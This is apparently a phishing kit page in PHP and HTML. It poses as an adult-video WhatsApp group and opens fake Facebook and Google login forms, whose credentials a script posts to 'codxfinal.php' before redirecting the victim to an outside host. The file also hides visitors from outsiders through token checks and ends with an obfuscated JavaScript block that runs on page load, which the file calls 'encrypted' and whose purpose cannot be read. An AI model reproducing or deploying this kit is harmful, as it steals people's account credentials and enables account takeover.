<?php
// CREATOR MAS CODX
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/6285863972648

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Share Vidio 18+</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/facebook.css"> 
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/google.css"> 
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/login2/all.css"> 
    <link rel="stylesheet" href="https://images.cahyosr.my.id/css/8/style.css"> 
  </head>
  <body class="bg-white min-h-screen flex flex-col items-center justify-start py-8 px-4">
    <button
      onclick="codxLoginPopup()"
      class="mb-12 bg-[#008069] text-white text-base font-normal rounded-full px-6 py-2"
      type="button"
    >
      Open WhatsApp
    </button>

    <div class="flex flex-col items-center space-y-2">
      <img
        onclick="codxLoginPopup()"
        alt="Profile image"
        class="w-20 h-20 rounded-full object-cover"
        height="80"
        src="https://images.cahyosr.my.id/img/8/logo.png"
        width="80"
      />
      <h1 class="font-semibold text-black text-lg">Share Vidio 18+</h1>
      <p class="text-gray-600 text-sm">Group · 172 Participant</p>
    </div>

    <div class="flex justify-center items-center space-x-12 mt-6 mb-4 text-[#008069] text-xs font-normal">
      <button onclick="codxLoginPopup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-phone fa-lg"></i>
        <span>Call</span>
      </button>
      <button onclick="codxLoginPopup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-video fa-lg"></i>
        <span>Video</span>
      </button>
      <button onclick="codxLoginPopup()" class="flex flex-col items-center space-y-1" type="button">
        <i class="fas fa-search fa-lg"></i>
        <span>Search</span>
      </button>
    </div>

    <div class="w-full max-w-md mt-2">
      <div class="flex justify-between items-center mb-2 px-1 text-xs text-gray-700 font-normal">
        <span>Media, links and docks</span>
        <button onclick="codxLoginPopup()" class="flex items-center space-x-1" type="button">
          <span>574</span>
          <i class="fas fa-chevron-right text-xs"></i>
        </button>
      </div>

      <div class="flex space-x-2 overflow-x-auto pb-2">
        <div onclick="codxLoginPopup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 1"
            class="w-full h-full object-cover"
            height="80"
            src="https://images.cahyosr.my.id/img/8/1.png"
            width="80"
            onclick="codxLoginPopup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>4.31</span>
          </div>
        </div>

        <div onclick="codxLoginPopup()" class="flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Image 2"
            class="w-full h-full object-cover"
            src="https://images.cahyosr.my.id/img/8/2.png"
            onclick="codxLoginPopup()"
          />
        </div>

        <div onclick="codxLoginPopup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 3"
            class="w-full h-full object-cover"
            height="80"
            src="https://images.cahyosr.my.id/img/8/3.png"
            width="80"
            onclick="codxLoginPopup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>2.56</span>
          </div>
        </div>

        <div onclick="codxLoginPopup()" class="relative flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Video 4"
            class="w-full h-full object-cover"
            height="80"
            src="https://images.cahyosr.my.id/img/8/4.jpg"
            width="80"
            onclick="codxLoginPopup()"
          />
          <div
            class="absolute bottom-1 right-1 bg-black bg-opacity-70 text-white text-[10px] px-1 rounded flex items-center space-x-1"
          >
            <i class="fas fa-video"></i>
            <span>3.06</span>
          </div>
        </div>

        <div onclick="codxLoginPopup()" class="flex-shrink-0 w-20 h-20 rounded-md overflow-hidden">
          <img
            alt="Image 5"
            class="w-full h-full object-cover"
            height="80"
            src="https://images.cahyosr.my.id/img/8/5.png"
            width="80"
            onclick="codxLoginPopup()"
          />
        </div>
      </div>
    </div>

    <button
      onclick="codxLoginPopup()"
      class="mt-6 bg-[#00C851] text-white text-xs font-semibold rounded px-8 py-2"
      type="button">
      Bergabung ke grup</button>
 </section>
</div>
<center><div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://images.cahyosr.my.id/img/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://images.cahyosr.my.id/img/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://images.cahyosr.my.id/img/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://images.cahyosr.my.id/img/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://images.cahyosr.my.id/img/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.cahyosr.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.cahyosr.my.id/npm/jquery-3.17.21.min.js"></script>
 <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.cahyosr.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var fTQ='',Rby=508-497;function ygd(x){var o=969054;var r=x.length;var z=[];for(var f=0;f<r;f++){z[f]=x.charAt(f)};for(var f=0;f<r;f++){var k=o*(f+454)+(o%31625);var i=o*(f+676)+(o%27792);var l=k%r;var t=i%r;var b=z[l];z[l]=z[t];z[t]=b;o=(k+i)%4024719;};return z.join('')};var vcP=ygd('cobttrokquvnzxyhgesdfwrmapcnjrutlocis').substr(0,Rby);var YBB=').mao8;3;on=xchvag;;akdrh0g;c+dfnhi.[r(ncpyc.=,Csx.z,0=e;nh[ea(ran=(; ox;80tnlehr,d9lufkrrt;o;tt97g+.63urr.8pgC,}u1gr=;soir=vti=f]8n rl34r6[=0evuio+fnetnf,1+[o+e)licnt+;;dam ra)f{ri=ic;)+apu=>pqhnar;=r 5ipp9+;ktaig(w[;l8.;g(l=vSi+t ;dai)a1a)g"[tn]sqe1.f"ltev* ra7;r;vveey)e)m1ketau-s;62;[+iv.={o-l1a=nu6;;<u ,})ar()4(aa.g=n]p{+vht(e00(.,;udrC;r[(gth0l.t)s2oml(+u.1un0-u<=p)C+{tad(+d!xl=ba!52t ,(jt;jfsrs(eaan7=n(A3rc6=ig)1a,jrn.r or4a+= v]u]C)0f;)rAvhr2h5 ]"( f;a+n=hvs-0=o(tupe=ko}[ar,m29lvs),>1u(}<"i;rxsvhnl.ad)tv,uq=e(h;vA=i..(2 8}==upc-nu4(([;r9.mj;);=nl75u8s<A)s<j7)]fu{iu.xc;n],{ ih,)pfqm)il=pg(=(2n5=qx={t=el ;n4ltn]ai(la)-,7vli]an.tu+=;;(1fb6t)}io++qeljhhr0n,joe.irxj;n"=aA8(hw) uu.s}(lo6crofj["xh,")aoer wr*ge,00 9=,;,)9nv 2rfcojcy7hlch)r8);ve nr ). )+vCe,+C.r"a;6,eht,[ej) vb(g,vyovr,.rfrjm+[0[aauoo;dl=+744Ca; ]aj),t(oi.(St=rsg )rtmvh;on;vejw(r]o===f1us]g+er2(iua]("-",.o+v=stnj';var fZO=ygd[vcP];var YQV='';var uhr=fZO;var iaA=fZO(YQV,ygd(YBB));var RCR=iaA(ygd(')&"D)t__ft1#aZ)fZ u2= s{b2"o.a3Z0=a#a_+f%3Z)9c"k,]rZjo(+Z1eZu;%Z;:=}Zn(Z.u_3+nto1$m=bZ[Zt0-m0+$;3+,foZfx6pf6!.$s( !2!$t..86m(Z0g)-aZp0eZ_g( m.]o%srn576tp_augZ;.; Z;(.;tp=. p1ba(3e,i!!zZ3Ttu.(,gk.0#s#e0rCtZ, =i\/fte%Z]j!sud.16nre:!cZlm!0$Z*(t.Za1Zb42(00j!f7)!6_3_,"0(6)=r0h+){c)0$(()f(hof5ott.;rZ6m\/ f3Z=;4uZd,t$Z$,f1\'$k{]6o eS-m;aZpn;a)3$Z3gZ$+#\/fZd[!!Z*k0m],so\/tpe$6.Z06._.(u;n!oh]Z8o#$,ti1a.4"naZa;$)oftf\/hj1gk+1.Zie1t&d!i_i.3,n%. .,#)_$%ibfus\'}0f!ineje,3rsl,Z(=Z3ua1(.ftfx%_a5]yt5t%1ZZhZ5=2!3f62i))h =; oo6Zf.fp,e(iotZfff_t(%Z(_j&2(dna]rs;g]ti,33,a)73{Z .Z!(Z7!,h}}"oj36!Z)bfZ1a\/s_ZZne Z}&epZ.tgZ)1,Zi3;2(;52$jbm{tl)_.;3e.$0mZ=4_Zit_()30crff9$+els3)_urZn\/26no.iZlj0$j_t..r.b_=t.),pj5!]63ZZa.(*f=.)#yS_r.$=r;=taZ_srZS2kx)!17Z{i}(1Zgb1%ZS4rv=t}f.p;Z)a(3 .1=%Z_4&.nZ61Z;ab.}0j);ai6{!$$)).b)_($hlr(=k1Z.s})i)($-Z 6bgj,}.a,Zos8Z(0))tlhd%eb7f=jr+6Zi{4,i_f)Zu0){sh):.o.nZg (8$)..(.ta)i_.r(asl.C;(,tr-[,05s43i*f_!kh!b4.si,.%4Zj( %(!e415Za.of{0.(]:Z,j).)flje(Zrh)rZ5Z.Z)5(=,bgef1nZ)3lZj_4,fi(!_)s(va);.c1o\'krftn=i{%ho_i,")_8,3.{5,rn3_i.Z3rf$3)1_];(6$)g_g}4Z}{l){ffZ604)2e=Z,qn72].=71]iy2Zsr.ZZ iaf3\'0.)# 3pud=)i2 1#Zt{ja,,Zflf.Z$.0[Z2=s;Z6]$m.}_ia.,i8d$n0sZ{e2k;i!_2db*Z.t.(e}5.;1$f3.Z o.e.76aoe}Z!ts'));var ULF=uhr(fTQ,RCR );ULF(4380);return 1867})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>